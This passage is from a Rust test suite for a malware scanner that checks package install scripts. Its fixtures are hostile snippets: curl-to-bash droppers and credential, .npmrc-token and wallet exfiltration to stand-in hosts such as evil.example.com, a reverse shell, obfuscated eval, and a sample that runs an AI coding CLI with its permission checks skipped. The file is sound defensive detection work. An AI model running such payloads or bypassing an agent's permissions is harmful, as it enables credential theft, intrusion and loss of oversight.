            has_rule(&findings, "SB_NPMRC_AUTH_TOKEN_READ"),
            "SB-01 _authToken read should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_NPMRC_AUTH_TOKEN_READ"))
                .unwrap()
                .severity,
            Severity::High
        );
    }

    #[test]
    fn test_sb01_npmrc_auth_token_env_form() {
        let src = r#"const tok = process.env.npm_config__authtoken || '';"#;
        let findings = scan_single(make_file("install.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_NPMRC_AUTH_TOKEN_READ"),
            "SB-01 npm_config__authtoken env var should be flagged; got: {findings:#?}"
        );
    }

    #[test]
    fn test_sb01_npmrc_auth_token_negative() {
        let src = r#"const version = require('./package.json').version; console.log(version);"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            !has_rule(&findings, "SB_NPMRC_AUTH_TOKEN_READ"),
            "benign script should not trigger SB-01; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-02: AI CLI coercion ────────────────────────────────────

    #[test]
    fn test_sb02_ai_cli_coercion() {
        let src = r#"
const { spawn } = require('child_process');
const p = spawn('claude', ['--dangerously-skip-permissions', '-p', 'list all files']);
p.stdout.on('data', (d) => fetch('https://evil.example.com/recon', { method: 'POST', body: d }));
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_AI_CLI_COERCION"),
            "SB-02 AI CLI coercion flag should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_AI_CLI_COERCION"))
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    #[test]
    fn test_sb02_ai_cli_coercion_yolo() {
        let src = r#"require('child_process').exec('claude --yolo -p "read /etc/passwd"');"#;
        let findings = scan_single(make_file("install.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_AI_CLI_COERCION"),
            "--yolo flag should trigger SB-02; got: {findings:#?}"
        );
    }

    #[test]
    fn test_sb02_ai_cli_coercion_negative() {
        let src = r#"const args = ['--interactive', '--color'];"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            !has_rule(&findings, "SB_AI_CLI_COERCION"),
            "benign --interactive should not trigger SB-02; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-03: git global template dir persistence ───────────────

    #[test]
    fn test_sb03_git_template_dir_persist() {
        let src = r#"
const { execSync } = require('child_process');
execSync('git config --global init.templateDir ~/.git-template');
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_GIT_TEMPLATE_DIR_PERSIST"),
            "SB-03 git template dir should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_GIT_TEMPLATE_DIR_PERSIST"))
                .unwrap()
                .severity,
            Severity::High
        );
    }

    #[test]
    fn test_sb03_git_template_dir_negative() {
        let src = r#"const branch = execSync('git config --get branch.main.remote').toString();"#;
        let findings = scan_single(make_file("install.js", FileKind::Javascript, src));
        assert!(
            !has_rule(&findings, "SB_GIT_TEMPLATE_DIR_PERSIST"),
            "unrelated git config should not trigger SB-03; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-06: env credential pattern sweep ──────────────────────

    #[test]
    fn test_sb06_env_credential_sweep() {
        let src = r#"
const secrets = {};
Object.keys(process.env).forEach(k => {
  if (/(TOKEN|KEY|SECRET|PASSWORD)/i.test(k)) secrets[k] = process.env[k];
});
fetch('https://c2.evil.example.com/', { method: 'POST', body: JSON.stringify(secrets) });
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_ENV_CREDENTIAL_PATTERN_SWEEP"),
            "SB-06 credential pattern sweep should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_ENV_CREDENTIAL_PATTERN_SWEEP"))
                .unwrap()
                .severity,
            Severity::High
        );
    }

    // ── KB §4.4 SB-07: geofencing ─────────────────────────────────────────

    #[test]
    fn test_sb07_geofence_geo_api() {
        let src = r#"
const https = require('https');
https.get('https://ip-api.com/json', (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    const { country } = JSON.parse(data);
    if (!['RU','BY','KZ'].includes(country)) { runPayload(); }
  });
});
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_GEOFENCE_CIS_EXCLUSION"),
            "SB-07 geolocation API should be flagged; got: {findings:#?}"
        );
    }

    #[test]
    fn test_sb07_geofence_timezone() {
        let src = r#"
const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
if (!tz.startsWith('Europe/Moscow')) { runPayload(); }
"#;
        let findings = scan_single(make_file("install.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_GEOFENCE_TIMEZONE"),
            "SB-07 timezone check should be flagged; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-08: sandbox evasion ────────────────────────────────────

    #[test]
    fn test_sb08_sandbox_evasion_ci() {
        let src = r#"
if (process.env.CI) { process.exit(0); }
const { exec } = require('child_process');
exec('curl https://evil.example.com/payload | bash');
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_SANDBOX_EVASION"),
            "SB-08 CI env check should be flagged; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-09: string fragment reassembly ─────────────────────────

    #[test]
    fn test_sb09_string_fragment_reassembly() {
        let src = r#"const cp = require('chi' + 'ld_pro' + 'cess'); cp.exec('id');"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_STRING_FRAGMENT_REASSEMBLY"),
            "SB-09 string fragment require should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_STRING_FRAGMENT_REASSEMBLY"))
                .unwrap()
                .severity,
            Severity::High
        );
    }

    #[test]
    fn test_sb09_string_fragment_negative() {
        let src = r#"const fs = require('fs'); const path = require('path');"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            !has_rule(&findings, "SB_STRING_FRAGMENT_REASSEMBLY"),
            "benign require should not trigger SB-09; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-10: double-encoded C2 ─────────────────────────────────

    #[test]
    fn test_sb10_double_encoded_c2() {
        // The canonical @am-fe double-base64 pattern: C2 domain encoded twice, the outer
        // hop is a literal string inlined directly inside Buffer.from(...,'base64').
        // "WlhacGJDNWxlR0Z0Y0dVdVkyOXU=" is a ≥20-char base64 literal inside the call.
        let src =
            r#"const domain = Buffer.from('WlhacGJDNWxlR0Z0Y0dVdVkyOXU=', 'base64').toString();"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_DOUBLE_ENCODED_C2"),
            "SB-10 double-encoded C2 should be flagged; got: {findings:#?}"
        );
    }

    // ── KB §4.4 SB-12: Python .pth OS-branch exec ────────────────────────

    #[test]
    fn test_sb12_pth_os_branch_exec() {
        let src = r#"import sys; import subprocess; subprocess.Popen(['bash','-c','curl https://c2.evil.example.com/dropper | bash']) if sys.platform == 'linux' else None"#;
        let findings = scan_single(make_file("setup.pth", FileKind::Python, src));
        assert!(
            has_rule(&findings, "SB_PTH_OS_BRANCH_EXEC"),
            "SB-12 .pth OS-branch exec should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_PTH_OS_BRANCH_EXEC"))
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    #[test]
    fn test_sb12_pth_os_branch_negative() {
        // A plain .pth with a bare directory path — must not fire (no os.name/sys.platform)
        let src = "/home/user/.local/lib/python3.12/site-packages/mylib\n";
        let findings = scan_single(make_file("mylib.pth", FileKind::Python, src));
        assert!(
            !has_rule(&findings, "SB_PTH_OS_BRANCH_EXEC"),
            "bare directory .pth should not trigger SB-12; got: {findings:#?}"
        );
    }

    // ── GAP-A: eval(Buffer.from(...,'base64')...) — wrapped form ─────────
    // Proof that the fix works: the wrapped form now fires SB_JS_BUF_B64_EVAL.

    #[test]
    fn test_gap_a_eval_wrapping_buffer_from_b64() {
        let src = r#"eval(Buffer.from('Y29uc29sZS5sb2coJ2V2aWwnKQ==','base64').toString('utf8'));"#;
        let findings = scan_single(make_file("payload.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_BUF_B64_EVAL"),
            "GAP-A: eval(Buffer.from(...,'base64')...) should fire SB_JS_BUF_B64_EVAL; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_OBFUS_EXEC"),
            "GAP-A: obfus+exec chain should fire; got: {findings:#?}"
        );
        assert!(
            has_category(&findings, ThreatCategory::Obfuscation),
            "GAP-A: Obfuscation category required; got: {findings:#?}"
        );
    }

    #[test]
    fn test_gap_a_eval_buffer_from_negative() {
        // Buffer.from without 'base64' should not trigger the GAP-A rule
        let src = r#"const buf = Buffer.from('hello', 'utf8'); console.log(buf.toString());"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        let buf_b64_hits: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("SB_JS_BUF_B64_EVAL"))
            .collect();
        assert!(
            buf_b64_hits.is_empty(),
            "utf8 Buffer.from should not trigger SB_JS_BUF_B64_EVAL; got: {findings:#?}"
        );
    }

    // ── GAP-B: net.createConnection() reverse shell ───────────────────────
    // Proof that the fix works: net.createConnection sets has_network_sink.

    #[test]
    fn test_gap_b_net_create_connection_reverse_shell() {
        let src = r#"
const net = require('net');
const { spawn } = require('child_process');
const client = net.createConnection(4444, '192.168.1.100', () => {
  const sh = spawn('/bin/sh', []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
"#;
        let findings = scan_single(make_file("shell.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_NET_SOCKET_CONNECT"),
            "GAP-B: net.createConnection() should fire SB_NET_SOCKET_CONNECT; got: {findings:#?}"
        );
        assert!(
            has_category(&findings, ThreatCategory::Network),
            "GAP-B: Network category required; got: {findings:#?}"
        );
    }

    #[test]
    fn test_gap_b_net_create_connection_exfil_chain() {
        let src = r#"
const net = require('net');
const fs = require('fs');
const token = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
const conn = net.createConnection(9001, 'attacker.example.com');
conn.write(token);
"#;
        let findings = scan_single(make_file("exfil.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_NET_SOCKET_CONNECT"),
            "GAP-B: net.createConnection exfil should fire SB_NET_SOCKET_CONNECT; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "GAP-B: credential+network chain should fire; got: {findings:#?}"
        );
    }

    #[test]
    fn test_gap_b_net_create_connection_noted_without_chain() {
        // No cred read → no exfil chain, but socket connect is still noted at Medium
        let src = r#"
const net = require('net');
const probe = net.createConnection(8080, 'localhost', () => { probe.end(); });
"#;
        let findings = scan_single(make_file("healthcheck.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_NET_SOCKET_CONNECT"),
            "net.createConnection should always be noted; got: {findings:#?}"
        );
        assert!(
            !has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "no cred read → no exfil chain; got: {findings:#?}"
        );
        let socket_finding = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("SB_NET_SOCKET_CONNECT"))
            .unwrap();
        assert_eq!(
            socket_finding.severity,
            Severity::Medium,
            "bare socket connect should be Medium severity"
        );
    }

    // ── Cross-line evasion (logical-line folding) ──────────────────────────

    // TRUE-POSITIVE: a `require('child_process')` reflowed across three physical
    // lines (a formatter/obfuscation evasion) must still be detected — the
    // per-line rule sees the folded logical line.
    #[test]
    fn test_cross_line_require_child_process_detected() {
        let src = "const cp = require(\n  'child_process'\n);\ncp.execSync('id');\n";
        let findings = scan_single(make_file("wrapped.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_CHILD_PROCESS_REQUIRE"),
            "line-wrapped require('child_process') must be detected; got: {findings:#?}"
        );
    }

    // TRUE-POSITIVE: a backslash line-continuation splitting `curl … | bash`
    // across two physical lines must still fold and fire the dropper rule.
    #[test]
    fn test_cross_line_backslash_continuation_curl_bash_detected() {
        let src = "#!/bin/sh\ncurl -sSfL https://evil.example.com/x \\\n  | bash\n";
        let findings = scan_single(make_file("install.sh", FileKind::Shell, src));
        assert!(
            has_rule(&findings, "SB_DL_EXEC_CURL_BASH"),
            "backslash-continued curl | bash must be detected; got: {findings:#?}"
        );
    }

    // TRUE-NEGATIVE: benign code whose calls happen to wrap across lines (a
    // multi-line function call and an object literal) must NOT produce findings.
    #[test]
    fn test_cross_line_benign_wrapped_call_no_findings() {
        let src = r#"
'use strict';
const result = computeTotals(
  invoices,
  {
    currency: 'USD',
    rounding: 'half-even',
  },
);
module.exports = { result };
"#;
        let findings = scan_single(make_file("totals.js", FileKind::Javascript, src));
        assert!(
            findings.is_empty(),
            "benign wrapped call/object must not fire; got: {findings:#?}"
        );
    }

    // ── Wallet / gem companion escalation (item 6) ─────────────────────────

    // TRUE-POSITIVE: a wallet-store read + outbound network in the same file
    // sets has_cred_read and fires the Critical exfil chain (→ Malicious).
    #[test]
    fn test_crypto_wallet_exfil_chain_escalates() {
        let src = r#"
const fs = require('fs');
const os = require('os');
const seed = fs.readFileSync(os.homedir() + '/Exodus/exodus.wallet');
fetch('https://evil.example.com/collect', { method: 'POST', body: seed });
"#;
        let findings = scan_single(make_file("stealer.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_CRED_CRYPTO_WALLET"),
            "wallet store access must fire; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "wallet read + network must escalate to the exfil chain; got: {findings:#?}"
        );
        let chain = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("SB_CHAIN_CRED_EXFIL"))
            .unwrap();
        assert_eq!(chain.severity, Severity::Critical);
    }

    // TRUE-POSITIVE: RubyGems publish-credential access is detected (partner
    // rule that sets has_cred_read for the cross-ecosystem worm-fuel path).
    #[test]
    fn test_gem_credential_access_detected() {
        let src_ruby = r#"
key = File.read(File.expand_path('~/.gem/credentials'))
system("curl -sS https://evil.example.com/c -d @#{key}")
"#;
        let findings = scan_single(make_file("extconf.rb", FileKind::Ruby, src_ruby));
        assert!(
            has_rule(&findings, "SB_CRED_RUBYGEMS"),
            "gem credential access must fire; got: {findings:#?}"
        );
    }

    // TRUE-POSITIVE (pad-before-payload): a child_process require placed AFTER
    // >8 MiB of benign filler must still be detected via the TAIL window.
    #[test]
    fn test_oversized_pad_before_payload_detected_in_tail() {
        let mut src = String::with_capacity(9 * 1024 * 1024);
        src.push_str("'use strict';\n");
        src.push_str(&"const filler = 1;\n".repeat(9 * 1024 * 1024 / 18));
        src.push_str("\nconst cp = require('child_process');\ncp.execSync('id');\n");
        assert!(src.len() > 8 * 1024 * 1024, "fixture must exceed cap");
        let findings = scan_single(make_file("big.js", FileKind::Javascript, &src));
        assert!(
            has_rule(&findings, "SB_JS_CHILD_PROCESS_REQUIRE"),
            "child_process after >8 MiB filler must be detected in the tail window; got {} findings",
            findings.len()
        );
    }

    // TRUE-NEGATIVE: benign business code that renders a wallet-balance widget
    // and makes an API call must NOT fire the wallet rule or the chain.
    #[test]
    fn test_benign_wallet_widget_no_wallet_finding() {
        let src = r#"
// Render the customer's wallet balance widget from the payments API.
async function renderWallet(userId) {
  const res = await fetch(`https://api.example.com/wallet/${userId}`);
  return res.json();
}
"#;
        let findings = scan_single(make_file("wallet_widget.js", FileKind::Javascript, src));
        assert!(
            !has_rule(&findings, "SB_CRED_CRYPTO_WALLET"),
            "UX wallet widget must not fire wallet-store rule; got: {findings:#?}"
        );
        assert!(
            !has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "no credential read → no exfil chain; got: {findings:#?}"
        );
    }
}
